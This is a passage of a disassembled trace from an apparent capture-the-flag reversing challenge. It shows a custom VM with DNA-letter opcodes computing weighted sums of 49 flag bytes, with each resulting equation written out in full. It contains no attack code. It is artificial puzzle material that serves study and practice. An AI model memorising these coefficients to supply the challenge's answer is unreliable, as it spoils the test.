push(mem[#0290])\n062e6 : CCAACGCCCCCC     push(#000000c5)\n062f2 : TA               push(pop() * pop())\n062f4 : TCACATTCCCCC     push(mem[#0291])\n06300 : CCATTCCCCCCC     push(#00000029)\n0630c : TA               push(pop() * pop())\n0630e : TCTCATTCCCCC     push(mem[#0292])\n0631a : CCCAAACCCCCC     push(#00000054)\n06326 : TA               push(pop() * pop())\n06328 : TCGCATTCCCCC     push(mem[#0293])\n06334 : CCTGCACCCCCC     push(#0000004e)\n06340 : TA               push(pop() * pop())\n06342 : TCCAATTCCCCC     push(mem[#0294])\n0634e : CCCATCCCCCCC     push(#00000024)\n0635a : TA               push(pop() * pop())\n0635c : TCAAATTCCCCC     push(mem[#0295])\n06368 : CCTCACCCCCCC     push(#00000012)\n06374 : TA               push(pop() * pop())\n06376 : TCTAATTCCCCC     push(mem[#0296])\n06382 : CCCTTGCCCCCC     push(#000000e8)\n0638e : TA               push(pop() * pop())\n06390 : TCGAATTCCCCC     push(mem[#0297])\n0639c : CCGCGGCCCCCC     push(#000000f3)\n063a8 : TA               push(pop() * pop())\n063aa : TCCTATTCCCCC     push(mem[#0298])\n063b6 : CCATGCCCCCCC     push(#00000039)\n063c2 : TA               push(pop() * pop())\n063c4 : TCATATTCCCCC     push(mem[#0299])\n063d0 : CCTGTACCCCCC     push(#0000006e)\n063dc : TA               push(pop() * pop())\n063de : TCTTATTCCCCC     push(mem[#029a])\n063ea : CCACATCCCCCC     push(#00000091)\n063f6 : TA               push(pop() * pop())\n063f8 : TCGTATTCCCCC     push(mem[#029b])\n06404 : CCTCACCCCCCC     push(#00000012)\n06410 : TA               push(pop() * pop())\n06412 : TCCGATTCCCCC     push(mem[#029c])\n0641e : CCGTCACCCCCC     push(#0000004b)\n0642a : TA               push(pop() * pop())\n0642c : TCAGATTCCCCC     push(mem[#029d])\n06438 : CCGAGCCCCCCC     push(#00000037)\n06444 : TA               push(pop() * pop())\n06446 : TCTGATTCCCCC     push(mem[#029e])\n06452 : CCCATTCCCCCC     push(#000000a4)\n0645e : TA               push(pop() * pop())\n06460 : TCGGATTCCCCC     push(mem[#029f])\n0646c : CCACAACCCCCC     push(#00000051)\n06478 : TA               push(pop() * pop())\n0647a : TCCCTTTCCCCC     push(mem[#02a0])\n06486 : CCCAGACCCCCC     push(#00000074)\n06492 : TA               push(pop() * pop())\n06494 : TCACTTTCCCCC     push(mem[#02a1])\n064a0 : CCAAACCCCCCC     push(#00000015)\n064ac : TA               push(pop() * pop())\n064ae : TCTCTTTCCCCC     push(mem[#02a2])\n064ba : CCTTGACCCCCC     push(#0000007a)\n064c6 : TA               push(pop() * pop())\n064c8 : TCGCTTTCCCCC     push(mem[#02a3])\n064d4 : CCTTGACCCCCC     push(#0000007a)\n064e0 : TA               push(pop() * pop())\n064e2 : TCCATTTCCCCC     push(mem[#02a4])\n064ee : CCAAGTCCCCCC     push(#000000b5)\n064fa : TA               push(pop() * pop())\n064fc : TCAATTTCCCCC     push(mem[#02a5])\n06508 : CCGTTTCCCCCC     push(#000000ab)\n06514 : TA               push(pop() * pop())\n06516 : TCTATTTCCCCC     push(mem[#02a6])\n06522 : CCATGCCCCCCC     push(#00000039)\n0652e : TA               push(pop() * pop())\n06530 : TCGATTTCCCCC     push(mem[#02a7])\n0653c : CCCAACCCCCCC     push(#00000014)\n06548 : TA               push(pop() * pop())\n0654a : TCCTTTTCCCCC     push(mem[#02a8])\n06556 : CCGGGCCCCCCC     push(#0000003f)\n06562 : TA               push(pop() * pop())\n06564 : TCATTTTCCCCC     push(mem[#02a9])\n06570 : CCGCATCCCCCC     push(#00000093)\n0657c : TA               push(pop() * pop())\n0657e : TCTTTTTCCCCC     push(mem[#02aa])\n0658a : CCTCCACCCCCC     push(#00000042)\n06596 : TA               push(pop() * pop())\n06598 : TCGTTTTCCCCC     push(mem[#02ab])\n065a4 : CCTCTGCCCCCC     push(#000000e2)\n065b0 : TA               push(pop() * pop())\n065b2 : TCCGTTTCCCCC     push(mem[#02ac])\n065be : CCCGGTCCCCCC     push(#000000bc)\n065ca : TA               push(pop() * pop())\n065cc : TCAGTTTCCCCC     push(mem[#02ad])\n065d8 : CCAGCTCCCCCC     push(#0000008d)\n065e4 : TA               push(pop() * pop())\n065e6 : TCTGTTTCCCCC     push(mem[#02ae])\n065f2 : CCCTTACCCCCC     push(#00000068)\n065fe : TA               push(pop() * pop())\n06600 : TCGGTTTCCCCC     push(mem[#02af])\n0660c : CCTCCGCCCCCC     push(#000000c2)\n06618 : TA               push(pop() * pop())\n0661a : TCCCGTTCCCCC     push(mem[#02b0])\n06626 : CCACAACCCCCC     push(#00000051)\n06632 : TA               push(pop() * pop())\n06634 : CA               push(pop() + pop())\n06636 : CA               push(pop() + pop())\n06638 : CA               push(pop() + pop())\n0663a : CA               push(pop() + pop())\n0663c : CA               push(pop() + pop())\n0663e : CA               push(pop() + pop())\n06640 : CA               push(pop() + pop())\n06642 : CA               push(pop() + pop())\n06644 : CA               push(pop() + pop())\n06646 : CA               push(pop() + pop())\n06648 : CA               push(pop() + pop())\n0664a : CA               push(pop() + pop())\n0664c : CA               push(pop() + pop())\n0664e : CA               push(pop() + pop())\n06650 : CA               push(pop() + pop())\n06652 : CA               push(pop() + pop())\n06654 : CA               push(pop() + pop())\n06656 : CA               push(pop() + pop())\n06658 : CA               push(pop() + pop())\n0665a : CA               push(pop() + pop())\n0665c : CA               push(pop() + pop())\n0665e : CA               push(pop() + pop())\n06660 : CA               push(pop() + pop())\n06662 : CA               push(pop() + pop())\n06664 : CA               push(pop() + pop())\n06666 : CA               push(pop() + pop())\n06668 : CA               push(pop() + pop())\n0666a : CA               push(pop() + pop())\n0666c : CA               push(pop() + pop())\n0666e : CA               push(pop() + pop())\n06670 : CA               push(pop() + pop())\n06672 : CA               push(pop() + pop())\n06674 : CA               push(pop() + pop())\n06676 : CA               push(pop() + pop())\n06678 : CA               push(pop() + pop())\n0667a : CA               push(pop() + pop())\n0667c : CA               push(pop() + pop())\n0667e : CA               push(pop() + pop())\n06680 : CA               push(pop() + pop())\n06682 : CA               push(pop() + pop())\n06684 : CA               push(pop() + pop())\n06686 : CA               push(pop() + pop())\n06688 : CA               push(pop() + pop())\n0668a : CA               push(pop() + pop())\n0668c : CA               push(pop() + pop())\n0668e : CA               push(pop() + pop())\n06690 : CA               push(pop() + pop())\n06692 : CA               push(pop() + pop())\n06694 : GCCTCACCACCC     mem[#1048] := pop()           memory[#01048] := ((flag[0] * 166) + ((flag[1] * 92) + ((flag[2] * 195) + ((flag[3] * 65) + ((flag[4] * 177) + ((flag[5] * 193) + ((flag[6] * 150) + ((flag[7] * 153) + ((flag[8] * 235) + ((flag[9] * 164) + ((flag[10] * 177) + ((flag[11] * 52) + ((flag[12] * 39) + ((flag[13] * 143) + ((flag[14] * 24) + ((flag[15] * 85) + ((flag[16] * 197) + ((flag[17] * 41) + ((flag[18] * 84) + ((flag[19] * 78) + ((flag[20] * 36) + ((flag[21] * 18) + ((flag[22] * 232) + ((flag[23] * 243) + ((flag[24] * 57) + ((flag[25] * 110) + ((flag[26] * 145) + ((flag[27] * 18) + ((flag[28] * 75) + ((flag[29] * 55) + ((flag[30] * 164) + ((flag[31] * 81) + ((flag[32] * 116) + ((flag[33] * 21) + ((flag[34] * 122) + ((flag[35] * 122) + ((flag[36] * 181) + ((flag[37] * 171) + ((flag[38] * 57) + ((flag[39] * 20) + ((flag[40] * 63) + ((flag[41] * 147) + ((flag[42] * 66) + ((flag[43] * 226) + ((flag[44] * 188) + ((flag[45] * 141) + ((flag[46] * 104) + ((flag[47] * 194) + (flag[48] * 81)))))))))))))))))))))))))))))))))))))))))))))))))\n066a0 : TCCCCTTCCCCC     push(mem[#0280])\n066ac : CCTTGGCCCCCC     push(#000000fa)\n066b8 : TA               push(pop() * pop())\n066ba : TCACCTTCCCCC     push(mem[#0281])\n066c6 : CCCAGTCCCCCC     push(#000000b4)\n066d2 : TA               push(pop() * pop())\n066d4 : TCTCCTTCCCCC     push(mem[#0282])\n066e0 : CCATGACCCCCC     push(#00000079)\n066ec : TA               push(pop() * pop())\n066ee : TCGCCTTCCCCC     push(mem[#0283])\n066fa : CCAGATCCCCCC     push(#0000009d)\n06706 : TA               push(pop() * pop())\n06708 : TCCACTTCCCCC     push(mem[#0284])\n06714 : CCCGACCCCCCC     push(#0000001c)\n06720 : TA               push(pop() * pop())\n06722 : TCAACTTCCCCC     push(mem[#0285])\n0672e : CCCGCGCCCCCC     push(#000000cc)\n0673a : TA               push(pop() * pop())\n0673c : TCTACTTCCCCC     push(mem[#0286])\n06748 : CCCTCCCCCCCC     push(#00000008)\n06754 : TA               push(pop() * pop())\n06756 : TCGACTTCCCCC     push(mem[#0287])\n06762 : CCTCGGCCCCCC     push(#000000f2)\n0676e : TA               push(pop() * pop())\n06770 : TCCTCTTCCCCC     push(mem[#0288])\n0677c : CCTCGACCCCCC     push(#00000072)\n06788 : TA               push(pop() * pop())\n0678a : TCATCTTCCCCC     push(mem[#0289])\n06796 : CCCGATCCCCCC     push(#0000009c)\n067a2 : TA               push(pop() * pop())\n067a4 : TCTTCTTCCCCC     push(mem[#028a])\n067b0 : CCAACCCCCCCC     push(#00000005)\n067bc : TA               push(pop() * pop())\n067be : TCGTCTTCCCCC     push(mem[#028b])\n067ca : CCCCGGCCCCCC     push(#000000f0)\n067d6 : TA               push(pop() * pop())\n067d8 : TCCGCTTCCCCC     push(mem[#028c])\n067e4 : CCGCGACCCCCC     push(#00000073)\n067f0 : TA               push(pop() * pop())\n067f2 : TCAGCTTCCCCC     push(mem[#028d])\n067fe : CCACCTCCCCCC     push(#00000081)\n0680a : TA               push(pop() * pop())\n0680c : TCTGCTTCCCCC     push(mem[#028e])\n06818 : CCTGCTCCCCCC     push(#0000008e)\n06824 : TA               push(pop() * pop())\n06826 : TCGGCTTCCCCC     push(mem[#028f])\n06832 : CCTCCGCCCCCC     push(#000000c2)\n0683e : TA               push(pop() * pop())\n06840 : TCCCATTCCCCC     push(mem[#0290])\n0684c : CCCCTTCCCCCC     push(#000000a0)\n06858 : TA               push(pop() * pop())\n0685a : TCACATTCCCCC     push(mem[#0291])\n06866 : CCCATCCCCCCC     push(#00000024)\n06872 : TA               push(pop() * pop())\n06874 : TCTCATTCCCCC     push(mem[#0292])\n06880 : CCCTCTCCCCCC     push(#00000088)\n0688c : TA               push(pop() * pop())\n0688e : TCGCATTCCCCC     push(mem[#0293])\n0689a : CCACCGCCCCCC     push(#000000c1)\n068a6 : TA               push(pop() * pop())\n068a8 : TCCAATTCCCCC     push(mem[#0294])\n068b4 : CCAAGTCCCCCC     push(#000000b5)\n068c0 : TA               push(pop() * pop())\n068c2 : TCAAATTCCCCC     push(mem[#0295])\n068ce : CCACGGCCCCCC     push(#000000f1)\n068da : TA               push(pop() * pop())\n068dc : TCTAATTCCCCC     push(mem[#0296])\n068e8 : CCGGGCCCCCCC     push(#0000003f)\n068f4 : TA               push(pop() * pop())\n068f6 : TCGAATTCCCCC     push(mem[#0297])\n06902 : CCAGGGCCCCCC     push(#000000fd)\n0690e : TA               push(pop() * pop())\n06910 : TCCTATTCCCCC     push(mem[#0298])\n0691c : CCTGGGCCCCCC     push(#000000fe)\n06928 : TA               push(pop() * pop())\n0692a : TCATATTCCCCC     push(mem[#0299])\n06936 : CCGCAGCCCCCC     push(#000000d3)\n06942 : TA               push(pop() * pop())\n06944 : TCTTATTCCCCC     push(mem[#029a])\n06950 : CCATGCCCCCCC     push(#00000039)\n0695c : TA               push(pop() * pop())\n0695e : TCGTATTCCCCC     push(mem[#029b])\n0696a : CCGCTCCCCCCC     push(#00000023)\n06976 : TA               push(pop() * pop())\n06978 : TCCGATTCCCCC     push(mem[#029c])\n06984 : CCATAACCCCCC     push(#00000059)\n06990 : TA               push(pop() * pop())\n06992 : TCAGATTCCCCC     push(mem[#029d])\n0699e : CCTCCACCCCCC     push(#00000042)\n069aa : TA               push(pop() * pop())\n069ac : TCTGATTCCCCC     push(mem[#029e])\n069b8 : CCGGGCCCCCCC     push(#0000003f)\n069c4 : TA               push(pop() * pop())\n069c6 : TCGGATTCCCCC     push(mem[#029f])\n069d2 : CCATCACCCCCC     push(#00000049)\n069de : TA               push(pop() * pop())\n069e0 : TCCCTTTCCCCC     push(mem[#02a0])\n069ec : CCGTGCCCCCCC     push(#0000003b)\n069f8 : TA               push(pop() * pop())\n069fa : TCACTTTCCCCC     push(mem[#02a1])\n06a06 : CCGTTTCCCCCC     push(#000000ab)\n06a12 : TA               push(pop() * pop())\n06a14 : TCTCTTTCCCCC     push(mem[#02a2])\n06a20 : CCATAGCCCCCC     push(#000000d9)\n06a2c : TA               push(pop() * pop())\n06a2e : TCGCTTTCCCCC     push(mem[#02a3])\n06a3a : CCACAGCCCCCC     push(#000000d1)\n06a46 : TA               push(pop() * pop())\n06a48 : TCCATTTCCCCC     push(mem[#02a4])\n06a54 : CCTGGACCCCCC     push(#0000007e)\n06a60 : TA               push(pop() * pop())\n06a62 : TCAATTTCCCCC     push(mem[#02a5])\n06a6e : CCGTATCCCCCC     push(#0000009b)\n06a7a : TA               push(pop() * pop())\n06a7c : TCTATTTCCCCC     push(mem[#02a6])\n06a88 : CCGAGGCCCCCC     push(#000000f7)\n06a94 : TA               push(pop() * pop())\n06a96 : TCGATTTCCCCC     push(mem[#02a7])\n06aa2 : CCGTTCCCCCCC     push(#0000002b)\n06aae : TA               push(pop() * pop())\n06ab0 : TCCTTTTCCCCC     push(mem[#02a8])\n06abc : CCTAATCCCCCC     push(#00000096)\n06ac8 : TA               push(pop() * pop())\n06aca : TCATTTTCCCCC     push(mem[#02a9])\n06ad6 : CCGCTACCCCCC     push(#00000063)\n06ae2 : TA               push(pop() * pop())\n06ae4 : TCTTTTTCCCCC     push(mem[#02aa])\n06af0 : CCATATCCCCCC     push(#00000099)\n06afc : TA               push(pop() * pop())\n06afe : TCGTTTTCCCCC     push(mem[#02ab])\n06b0a : CCGAAGCCCCCC     push(#000000d7)\n06b16 : TA               push(pop() * pop())\n06b18 : TCCGTTTCCCCC     push(mem[#02ac])\n06b24 : CCCACTCCCCCC     push(#00000084)\n06b30 : TA               push(pop() * pop())\n06b32 : TCAGTTTCCCCC     push(mem[#02ad])\n06b3e : CCGATACCCCCC     push(#00000067)\n06b4a : TA               push(pop() * pop())\n06b4c : TCTGTTTCCCCC     push(mem[#02ae])\n06b58 : CCCCACCCCCCC     push(#00000010)\n06b64 : TA               push(pop() * pop())\n06b66 : TCGGTTTCCCCC     push(mem[#02af])\n06b72 : CCTAAACCCCCC     push(#00000056)\n06b7e : TA               push(pop() * pop())\n06b80 : TCCCGTTCCCCC     push(mem[#02b0])\n06b8c : CCTCGGCCCCCC     push(#000000f2)\n06b98 : TA               push(pop() * pop())\n06b9a : CA               push(pop() + pop())\n06b9c : CA               push(pop() + pop())\n06b9e : CA               push(pop() + pop())\n06ba0 : CA               push(pop() + pop())\n06ba2 : CA               push(pop() + pop())\n06ba4 : CA               push(pop() + pop())\n06ba6 : CA               push(pop() + pop())\n06ba8 : CA               push(pop() + pop())\n06baa : CA               push(pop() + pop())\n06bac : CA               push(pop() + pop())\n06bae : CA               push(pop() + pop())\n06bb0 : CA               push(pop() + pop())\n06bb2 : CA               push(pop() + pop())\n06bb4 : CA               push(pop() + pop())\n06bb6 : CA               push(pop() + pop())\n06bb8 : CA               push(pop() + pop())\n06bba : CA               push(pop() + pop())\n06bbc : CA               push(pop() + pop())\n06bbe : CA               push(pop() + pop())\n06bc0 : CA               push(pop() + pop())\n06bc2 : CA               push(pop() + pop())\n06bc4 : CA               push(pop() + pop())\n06bc6 : CA               push(pop() + pop())\n06bc8 : CA               push(pop() + pop())\n06bca : CA               push(pop() + pop())\n06bcc : CA               push(pop() + pop())\n06bce : CA               push(pop() + pop())\n06bd0 : CA               push(pop() + pop())\n06bd2 : CA               push(pop() + pop())\n06bd4 : CA               push(pop() + pop())\n06bd6 : CA               push(pop() + pop())\n06bd8 : CA               push(pop() + pop())\n06bda : CA               push(pop() + pop())\n06bdc : CA               push(pop() + pop())\n06bde : CA               push(pop() + pop())\n06be0 : CA               push(pop() + pop())\n06be2 : CA               push(pop() + pop())\n06be4 : CA               push(pop() + pop())\n06be6 : CA               push(pop() + pop())\n06be8 : CA               push(pop() + pop())\n06bea : CA               push(pop() + pop())\n06bec : CA               push(pop() + pop())\n06bee : CA               push(pop() + pop())\n06bf0 : CA               push(pop() + pop())\n06bf2 : CA               push(pop() + pop())\n06bf4 : CA               push(pop() + pop())\n06bf6 : CA               push(pop() + pop())\n06bf8 : CA               push(pop() + pop())\n06bfa : GCCGCACCACCC     mem[#104c] := pop()           memory[#0104c] := ((flag[0] * 250) + ((flag[1] * 180) + ((flag[2] * 121) + ((flag[3] * 157) + ((flag[4] * 28) + ((flag[5] * 204) + ((flag[6] * 8) + ((flag[7] * 242) + ((flag[8] * 114) + ((flag[9] * 156) + ((flag[10] * 5) + ((flag[11] * 240) + ((flag[12] * 115) + ((flag[13] * 129) + ((flag[14] * 142) + ((flag[15] * 194) + ((flag[16] * 160) + ((flag[17] * 36) + ((flag[18] * 136) + ((flag[19] * 193) + ((flag[20] * 181) + ((flag[21] * 241) + ((flag[22] * 63) + ((flag[23] * 253) + ((flag[24] * 254) + ((flag[25] * 211) + ((flag[26] * 57) + ((flag[27] * 35) + ((flag[28] * 89) + ((flag[29] * 66) + ((flag[30] * 63) + ((flag[31] * 73) + ((flag[32] * 59) + ((flag[33] * 171) + ((flag[34] * 217) + ((flag[35] * 209) + ((flag[36] * 126) + ((flag[37] * 155) + ((flag[38] * 247) + ((flag[39] * 43) + ((flag[40] * 150) + ((flag[41] * 99) + ((flag[42] * 153) + ((flag[43] * 215) + ((flag[44] * 132) + ((flag[45] * 103) + ((flag[46] * 16) + ((flag[47] * 86) + (flag[48] * 242)))))))))))))))))))))))))))))))))))))))))))))))))\n06c06 : TCCCCTTCCCCC     push(mem[#0280])\n06c12 : CCCCGTCCCCCC     push(#000000b0)\n06c1e : TA               push(pop() * pop())\n06c20 : TCACCTTCCCCC     push(mem[#0281])\n06c2c : CCCAGTCCCCCC     push(#000000b4)\n06c38 : TA               push(pop() * pop())\n06c3a : TCTCCTTCCCCC     push(mem[#0282])\n06c46 : CCTCGACCCCCC     push(#00000072)\n06c52 : TA               push(pop() * pop())\n06c54 : TCGCCTTCCCCC     push(mem[#0283])\n06c60 : CCATAGCCCCCC     push(#000000d9)\n06c6c : TA               push(pop() * pop())\n06c6e : TCCACTTCCCCC     push(mem[#0284])\n06c7a : CCATTGCCCCCC     push(#000000e9)\n06c86 : TA               push(pop() * pop())\n06c88 : TCAACTTCCCCC     push(mem[#0285])\n06c94 : CCCGCACCCCCC     push(#0000004c)\n06ca0 : TA               push(pop() * pop())\n06ca2 : TCTACTTCCCCC     push(mem[#0286])\n06cae : CCTGATCCCCCC     push(#0000009e)\n06cba : TA               push(pop() * pop())\n06cbc : TCGACTTCCCCC     push(mem[#0287])\n06cc8 : CCGGCACCCCCC     push(#0000004f)\n06cd4 : TA               push(pop() * pop())\n06cd6 : TCCTCTTCCCCC     push(mem[#0288])\n06ce2 : CCGCTCCCCCCC     push(#00000023)\n06cee : TA               push(pop() * pop())\n06cf0 : TCATCTTCCCCC     push(mem[#0289])\n06cfc : CCGGGACCCCCC     push(#0000007f)\n06d08 : TA               push(pop() * pop())\n06d0a : TCTTCTTCCCCC     push(mem[#028a])\n06d16 : CCGATTCCCCCC     push(#000000a7)\n06d22 : TA               push(pop() * pop())\n06d24 : TCGTCTTCCCCC     push(mem[#028b])\n06d30 : CCTGTCCCCCCC     push(#0000002e)\n06d3c : TA               push(pop() * pop())\n06d3e : TCCGCTTCCCCC     push(mem[#028c])\n06d4a : CCGAGACCCCCC     push(#00000077)\n06d56 : TA               push(pop() * pop())\n06d58 : TCAGCTTCCCCC     push(mem[#028d])\n06d64 : CCTGAGCCCCCC     push(#000000de)\n06d70 : TA               push(pop() * pop())\n06d72 : TCTGCTTCCCCC     push(mem[#028e])\n06d7e : CCCCCTCCCCCC     push(#00000080)\n06d8a : TA               push(pop() * pop())\n06d8c : TCGGCTTCCCCC     push(mem[#028f])\n06d98 : CCATTTCCCCCC     push(#000000a9)\n06da4 : TA               push(pop() * pop())\n06da6 : TCCCATTCCCCC     push(mem[#0290])\n06db2 : CCGGGTCCCCCC     push(#000000bf)\n06dbe : TA               push(pop() * pop())\n06dc0 : TCACATTCCCCC     push(mem[#0291])\n06dcc : CCAGGGCCCCCC     push(#000000fd)\n06dd8 : TA               push(pop() * pop())\n06dda : TCTCATTCCCCC     push(mem[#0292])\n06de6 : CCCTGACCCCCC     push(#00000078)\n06df2 : TA               push(pop() * pop())\n06df4 : TCGCATTCCCCC     push(mem[#0293])\n06e00 : CCTGGTCCCCCC     push(#000000be)\n06e0c : TA               push(pop() * pop())\n06e0e : TCCAATTCCCCC     push(mem[#0294])\n06e1a : CCGTGACCCCCC     push(#0000007b)\n06e26 : TA               push(pop() * pop())\n06e28 : TCAAATTCCCCC     push(mem[#0295])\n06e34 : CCCGTGCCCCCC     push(#000000ec)\n06e40 : TA               push(pop() * pop())\n06e42 : TCTAATTCCCCC     push(mem[#0296])\n06e4e : CCTGTACCCCCC     push(#0000006e)\n06e5a : TA               push(pop() * pop())\n06e5c : TCGAATTCCCCC     push(mem[#0297])\n06e68 : CCGCTTCCCCCC     push(#000000a3)\n06e74 : TA               push(pop() * pop())\n06e76 : TCCTATTCCCCC     push(mem[#0298])\n06e82 : CCACCACCCCCC     push(#00000041)\n06e8e : TA               push(pop() * pop())\n06e90 : TCATATTCCCCC     push(mem[#0299])\n06e9c : CCTGAACCCCCC     push(#0000005e)\n06ea8 : TA               push(pop() * pop())\n06eaa : TCTTATTCCCCC     push(mem[#029a])\n06eb6 : CCTAACCCCCCC     push(#00000016)\n06ec2 : TA               push(pop() * pop())\n06ec4 : TCGTATTCCCCC     push(mem[#029b])\n06ed0 : CCGGACCCCCCC     push(#0000001f)\n06edc : TA               push(pop() * pop())\n06ede : TCCGATTCCCCC     push(mem[#029c])\n06eea : CCGCTCCCCCCC     push(#00000023)\n06ef6 : TA               push(pop() * pop())\n06ef8 : TCAGATTCCCCC     push(mem[#029d])\n06f04 : CCGATGCCCCCC     push(#000000e7)\n06f10 : TA               push(pop() * pop())\n06f12 : TCTGATTCCCCC     push(mem[#029e])\n06f1e : CCCCACCCCCCC     push(#00000010)\n06f2a : TA               push(pop() * pop())\n06f2c : TCGGATTCCCCC     push(mem[#029f])\n06f38 : CCTGTTCCCCCC     push(#000000ae)\n06f44 : TA               push(pop() * pop())\n06f46 : TCCCTTTCCCCC     push(mem[#02a0])\n06f52 : CCCTTTCCCCCC     push(#000000a8)\n06f5e : TA               push(pop() * pop())\n06f60 : TCACTTTCCCCC     push(mem[#02a1])\n06f6c : CCTTTACCCCCC     push(#0000006a)\n06f78 : TA               push(pop() * pop())\n06f7a : TCTCTTTCCCCC     push(mem[#02a2])\n06f86 : CCGGAACCCCCC     push(#0000005f)\n06f92 : TA               push(pop() * pop())\n06f94 : TCGCTTTCCCCC     push(mem[#02a3])\n06fa0 : CCAGAACCCCCC     push(#0000005d)\n06fac : TA               push(pop() * pop())\n06fae : TCCATTTCCCCC     push(mem[#02a4])\n06fba : CCCCTTCCCCCC     push(#000000a0)\n06fc6 : TA               push(pop() * pop())\n06fc8 : TCAATTTCCCCC     push(mem[#02a5])\n06fd4 : CCAGACCCCCCC     push(#0000001d)\n06fe0 : TA               push(pop() * pop())\n06fe2 : TCTATTTCCCCC     push(mem[#02a6])\n06fee : CCGCGTCCCCCC     push(#000000b3)\n06ffa : TA               push(pop() * pop())\n06ffc : TCGATTTCCCCC     push(mem[#02a7])\n07008 : CCAAGCCCCCCC     push(#00000035)\n07014 : TA               push(pop() * pop())\n07016 : TCCTTTTCCCCC     push(mem[#02a8])\n07022 : CCGAGTCCCCCC     push(#000000b7)\n0702e : TA               push(pop() * pop())\n07030 : TCATTTTCCCCC     push(mem[#02a9])\n0703c : CCGACCCCCCCC     push(#00000007)\n07048 : TA               push(pop() * pop())\n0704a : TCTTTTTCCCCC     push(mem[#02aa])\n07056 : CCCGGCCCCCCC     push(#0000003c)\n07062 : TA               push(pop() * pop())\n07064 : TCGTTTTCCCCC     push(mem[#02ab])\n07070 : CCTCTTCCCCCC     push(#000000a2)\n0707c : TA               push(pop() * pop())\n0707e : TCCGTTTCCCCC     push(mem[#02ac])\n0708a : CCAGGTCCCCCC     push(#000000bd)\n07096 : TA               push(pop() * pop())\n07098 : TCAGTTTCCCCC     push(mem[#02ad])\n070a4 : CCTTCACCCCCC     push(#0000004a)\n070b0 : TA               push(pop() * pop())\n070b2 : TCTGTTTCCCCC     push(mem[#02ae])\n070be : CCTGTACCCCCC     push(#0000006e)\n070ca : TA               push(pop() * pop())\n070cc : TCGGTTTCCCCC     push(mem[#02af])\n070d8 : CCTTTACCCCCC     push(#0000006a)\n070e4 : TA               push(pop() * pop())\n070e6 : TCCCGTTCCCCC     push(mem[#02b0])\n070f2 : CCGATACCCCCC     push(#00000067)\n070fe : TA               push(pop() * pop())\n07100 : CA               push(pop() + pop())\n07102 : CA               push(pop() + pop())\n07104 : CA               push(pop() + pop())\n07106 : CA               push(pop() + pop())\n07108 : CA               push(pop() + pop())\n0710a : CA               push(pop() + pop())\n0710c : CA               push(pop() + pop())\n0710e : CA               push(pop() + pop())\n07110 : CA               push(pop() + pop())\n07112 : CA               push(pop() + pop())\n07114 : CA               push(pop() + pop())\n07116 : CA               push(pop() + pop())\n07118 : CA               push(pop() + pop())\n0711a : CA               push(pop() + pop())\n0711c : CA               push(pop() + pop())\n0711e : CA               push(pop() + pop())\n07120 : CA               push(pop() + pop())\n07122 : CA               push(pop() + pop())\n07124 : CA               push(pop() + pop())\n07126 : CA               push(pop() + pop())\n07128 : CA               push(pop() + pop())\n0712a : CA               push(pop() + pop())\n0712c : CA               push(pop() + pop())\n0712e : CA               push(pop() + pop())\n07130 : CA               push(pop() + pop())\n07132 : CA               push(pop() + pop())\n07134 : CA               push(pop() + pop())\n07136 : CA               push(pop() + pop())\n07138 : CA               push(pop() + pop())\n0713a : CA               push(pop() + pop())\n0713c : CA               push(pop() + pop())\n0713e : CA               push(pop() + pop())\n07140 : CA               push(pop() + pop())\n07142 : CA               push(pop() + pop())\n07144 : CA               push(pop() + pop())\n07146 : CA               push(pop() + pop())\n07148 : CA               push(pop() + pop())\n0714a : CA               push(pop() + pop())\n0714c : CA               push(pop() + pop())\n0714e : CA               push(pop() + pop())\n07150 : CA               push(pop() + pop())\n07152 : CA               push(pop() + pop())\n07154 : CA               push(pop() + pop())\n07156 : CA               push(pop() + pop())\n07158 : CA               push(pop() + pop())\n0715a : CA               push(pop() + pop())\n0715c : CA               push(pop() + pop())\n0715e : CA               push(pop() + pop())\n07160 : GCCCAACCACCC     mem[#1050] := pop()           memory[#01050] := ((flag[0] * 176) + ((flag[1] * 180) + ((flag[2] * 114) + ((flag[3] * 217) + ((flag[4] * 233) + ((flag[5] * 76) + ((flag[6] * 158) + ((flag[7] * 79) + ((flag[8] * 35) + ((flag[9] * 127) + ((flag[10] * 167) + ((flag[11] * 46) + ((flag[12] * 119) + ((flag[13] * 222) + ((flag[14] * 128) + ((flag[15] * 169) + ((flag[16] * 191) + ((flag[17] * 253) + ((flag[18] * 120) + ((flag[19] * 190) + ((flag[20] * 123) + ((flag[21] * 236) + ((flag[22] * 110) + ((flag[23] * 163) + ((flag[24] * 65) + ((flag[25] * 94) + ((flag[26] * 22) + ((flag[27] * 31) + ((flag[28] * 35) + ((flag[29] * 231) + ((flag[30] * 16) + ((flag[31] * 174) + ((flag[32] * 168) + ((flag[33] * 106) + ((flag[34] * 95) + ((flag[35] * 93) + ((flag[36] * 160) + ((flag[37] * 29) + ((flag[38] * 179) + ((flag[39] * 53) + ((flag[40] * 183) + ((flag[41] * 7) + ((flag[42] * 60) + ((flag[43] * 162) + ((flag[44] * 189) + ((flag[45] * 74) + ((flag[46] * 110) + ((flag[47] * 106) + (flag[48] * 103)))))))))))))))))))))))))))))))))))))))))))))))))\n0716c : TCCCCTTCCCCC     push(mem[#0280])\n07178 : CCCTGGCCCCCC     push(#000000f8)\n07184 : TA               push(pop() * pop())\n07186 : TCACCTTCCCCC     push(mem[#0281])\n07192 : CCAACACCCCCC     push(#00000045)\n0719e : TA               push(pop() * pop())\n071a0 : TCTCCTTCCCCC     push(mem[#0282])\n071ac : CCAGTTCCCCCC     push(#000000ad)\n071b8 : TA               push(pop() * pop())\n071ba : TCGCCTTCCCCC     push(mem[#0283])\n071c6 : CCATTTCCCCCC     push(#000000a9)\n071d2 : TA               push(pop() * pop())\n071d4 : TCCACTTCCCCC     push(mem[#0284])\n071e0 : CCCTAACCCCCC     push(#00000058)\n071ec : TA               push(pop() * pop())\n071ee : TCAACTTCCCCC     push(mem[#0285])\n071fa : CCATTTCCCCCC     push(#000000a9)\n07206 : TA               push(pop() * pop())\n07208 : TCTACTTCCCCC     push(mem[#0286])\n07214 : CCATCACCCCCC     push(#00000049)\n07220 : TA               push(pop() * pop())\n07222 : TCGACTTCCCCC     push(mem[#0287])\n0722e : CCCGGTCCCCCC     push(#000000bc)\n0723a : TA               push(pop() * pop())\n0723c : TCCTCTTCCCCC     push(mem[#0288])\n07248 : CCGTTACCCCCC     push(#0000006b)\n07254 : TA               push(pop() * pop())\n07256 : TCATCTTCCCCC     push(mem[#0289])\n07262 : CCTGTACCCCCC     push(#0000006e)\n0726e : TA               push(pop() * pop())\n07270 : TCTTCTTCCCCC     push(mem[#028a])\n0727c : CCTAATCCCCCC     push(#00000096)\n07288 : TA               push(pop() * pop())\n0728a : 